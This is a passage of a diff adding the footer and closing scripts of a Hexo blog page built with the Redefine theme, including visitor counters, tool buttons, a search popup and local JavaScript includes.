+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.4</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+    
+<script src="/js/build/libs/minimasonry.min.js"></script>
+
+    
+<script src="/js/build/plugins/masonry.js" type="module"></script>
+
+
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
